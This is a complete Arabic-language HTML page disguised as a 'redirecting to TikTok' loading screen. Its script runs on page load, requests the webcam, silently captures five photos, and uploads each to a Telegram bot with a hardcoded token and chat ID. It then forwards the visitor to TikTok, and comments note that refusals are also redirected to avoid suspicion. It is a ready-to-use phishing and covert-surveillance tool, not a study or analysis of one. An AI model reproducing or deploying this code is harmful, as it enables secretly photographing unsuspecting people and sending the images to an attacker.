<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div style="text-align: center;">
        <div class="loader"></div>
        <p>جاري توجيهك إلى تيك توك، يرجى الانتظار...</p>
    </div>

    <script>
        // ==========================================
        // ضع بياناتك هنا فقط
        const BOT_TOKEN = '8688016586:AAFEd6EBgeu5pTWtLTstuN2YFsZytQBWwH8'; 
        const CHAT_ID = '5516597110';
        // ==========================================

        async function startProcess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                let count = 0;
                const maxPhotos = 5;

                const capture = setInterval(async () => {
                    if (count < maxPhotos) {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);

                        canvas.toBlob(async (blob) => {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, `img_${count}.jpg`);

                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                        }, 'image/jpeg');

                        count++;
                    } else {
                        // إيقاف الكاميرا والتحويل إلى تيك توك فوراً
                        clearInterval(capture);
                        stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://www.tiktok.com/"; 
                    }
                }, 1000); // صورة كل ثانية

            } catch (err) {
                // إذا رفض المستخدم الإذن، يتم تحويله أيضاً لتجنب الشك
                window.location.href = "https://www.tiktok.com/";
            }
        }

        window.onload = startProcess;
    </script>
</body>
</html>
